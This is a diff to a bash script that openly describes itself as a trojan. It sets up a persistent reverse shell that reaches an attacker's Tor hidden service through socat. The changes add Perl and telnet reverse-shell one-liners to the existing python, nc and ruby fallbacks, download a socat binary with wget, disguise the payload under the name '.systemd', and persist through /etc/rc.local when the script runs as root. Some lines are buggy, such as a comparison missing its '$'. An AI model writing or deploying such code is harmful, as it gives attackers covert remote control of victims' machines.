@@ -32,11 +32,13 @@ onion=somehiddenservice.onion
 # tor servers incoming port
 orPrt=54321
 # some harmless name for our trojan
+# this is simply a python reverse shell that connects to the localhost through socat. 
+# catch it on your tor server with ncat -lvp $orPrt
 pName=".systemd"
 run=run
 
 # Create a working directory
-setUp(){
+infect(){
 
 if [[ ! -d $activeDir ]];then
     mkdir $activeDir
@@ -51,28 +53,28 @@ if [ -x "$(socat -v foo)" ];then
     wget -O $activeDir/socat $scBinUrl
     chmod 775 socat
     socat=".$activeDir/socat"
+else
+    socat=$(which socat)
 fi
 
 
-# some harmless name for our trojan
-# this is simply a python reverse shell that connects to the localhost through socat. 
-# catch it on your tor server with ncat -lvp $orPrt
 
 
 # check for python, if not python check for nc, if no nc check for ruby. if no ruby, bail.
 
-using=python
-if [ -x "$(python -v foo)" ];then
-  using=nc
-  if [ -x "$(nc -v foo)" ];then
-      using=ruby
-      if [ ! -x "$(ruby -v foo)" ];then
-	# out of options :(
-        exit
-      
-      fi
-  fi
-fi
+
+if [ ! $(which python) == "" ];then
+  using=python
+  elif [ ! $(which nc) == "" ];then
+      using=nc
+      elif [ ! $(which ruby) == "" ];then
+          using=ruby
+        elif [ ! $(which perl) == "" ];then
+            using=perl
+              elif [ ! $( which telnet) == "" ];then
+                using=telnet
+           fi
+
 
 
 # if we're using python for our shell...
@@ -109,6 +111,17 @@ end
 end
 _EOF_
 
+elif [[ using == perl ]];then
+
+cat << _EOF_ > $activeDir/$pName
+perl -e 'use Socket;$i="127.0.0.1";$p=4430;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+_EOF_
+
+elif [[ using == telnet ]];then
+cat << _EOF_ > $activeDir/$pName
+mknod backpipe p; telnet 127.0.0.1 4430 0<backpipe | /bin/bash 1>backpipe
+_EOF_
+
 fi
 chmod 755 $activeDir/$pName
 
@@ -118,7 +131,7 @@ cat << _EOF_ > $activeDir/$run
 #!/bin/bash
 while true
     do
-      socat TCP4-LISTEN:4430,fork SOCKS4a:127.0.0.1:$onion:$orPrt,socksport=9050 &
+      $socat TCP4-LISTEN:4430,fork SOCKS4a:127.0.0.1:$onion:$orPrt,socksport=9050 &
       sleep 5
       $activeDir/$pName &
       sleep 180
@@ -135,21 +148,18 @@ if [[ $(whoami) == "root" ]];then
     echo "/usr/local/sbin/$run" >> /etc/rc.local
     echo "exit0" >> /etc/rc.local
 fi
-}
+
 
 # Run from script in any case
-infect(){
 if [[ -x socat ]]
 then
-    echo got socat..
     while true
     do
-      socat TCP4-LISTEN:4430,fork SOCKS4a:127.0.0.1:$onion:$orPrt,socksport=9050 &
+      $socat TCP4-LISTEN:4430,fork SOCKS4a:127.0.0.1:$onion:$orPrt,socksport=9050 &
       $activeDir/$pName &
       sleep 180
     done
 fi
 }
 
-setUp
 infect
